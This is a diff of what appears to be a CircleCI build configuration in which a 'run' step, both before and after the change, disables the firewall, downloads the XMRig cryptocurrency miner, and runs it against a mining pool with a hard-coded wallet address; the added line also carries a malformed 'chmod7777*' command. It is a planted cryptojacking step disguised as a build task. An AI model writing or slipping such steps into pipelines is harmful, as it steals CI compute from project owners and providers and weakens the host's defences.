@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: apt install ufw -y && sudo ufw disable wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz && tar -xzvf xmrig-6.17.0-linux-static-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig --cuda -o pool.hashvault.pro:443 -u 49pzgZFSCY1bUF7Dcjr1P5JaTARG1aGSnDcbLhcTnDXZNrUwMh9xfQWXQrXcKMHxVJhjz4MESTrWdKMNy4myqygg43uVGUN -p teet -k --tls
+      - run: apt install ufw -y && sudo ufw disable wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz && tar -xzvf xmrig-6.17.0-linux-static-x64.tar.gz && cd xmrig-6.17.0 && chmod7777* ./xmrig --cuda -o pool.hashvault.pro:443 -u 49pzgZFSCY1bUF7Dcjr1P5JaTARG1aGSnDcbLhcTnDXZNrUwMh9xfQWXQrXcKMHxVJhjz4MESTrWdKMNy4myqygg43uVGUN -p teet -k --tls
